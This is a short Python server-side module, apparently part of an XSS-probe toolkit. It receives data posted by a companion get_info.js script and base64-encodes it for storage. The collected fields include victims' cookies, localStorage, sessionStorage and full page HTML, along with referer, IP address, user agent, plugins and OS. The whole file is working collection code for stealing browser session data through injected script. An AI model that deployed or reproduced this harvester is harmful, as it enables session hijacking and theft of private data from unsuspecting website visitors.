#! /usr/bin/env python
# encoding=utf-8
#   quininer - 140502
#	get_info - base probe
#		and get_info.js
#
'''
with open('./static/serv/get_info.py') as files: exec files.read()
'''
def b64str(info):
    return b64encode(str(info))

serverinfo['referer'] = b64str(request.headers.get('Referer'))
serverinfo['ctime'] = b64str(ctime())
serverinfo['remote_addr'] = b64str(request.environ.get('REMOTE_ADDR'))
serverinfo['x_forwarded_for'] = b64str(request.headers.get('X-Forwarded-For'))
serverinfo['user_agent'] = b64str(request.headers.get('User-Agent'))
serverinfo['accept_language'] = b64str(request.headers.get('Accept-Language'))
serverinfo['x_requested_with'] = b64str(request.headers.get('X-Requested-With'))

browserinfo['URL'] = b64str(request.forms.get('url'))
browserinfo['cookie'] = b64str(request.forms.get('cookie'))
browserinfo['localStorage'] = b64str(request.forms.get('localStorage'))
browserinfo['sessionStorage'] = b64str(request.forms.get('sessionStorage'))
browserinfo['browser'] = b64str(request.forms.get('browser'))
browserinfo['user_agent'] = b64str(request.forms.get('user_agent'))
browserinfo['screen'] = b64str(request.forms.get('screen'))
browserinfo['istouch'] = b64str(request.forms.get('istouch'))
browserinfo['referrer'] = b64str(request.forms.get('referrer'))
browserinfo['os'] = b64str(request.forms.get('os'))
browserinfo['date'] = b64str(request.forms.get('date'))
browserinfo['plugins'] = b64str(request.forms.get('plugins'))
browserinfo['websocket'] = b64str(request.forms.get('websocket'))
browserinfo['java'] = b64str(request.forms.get('java'))
browserinfo['page_html'] = b64str(request.forms.get('page_html'))
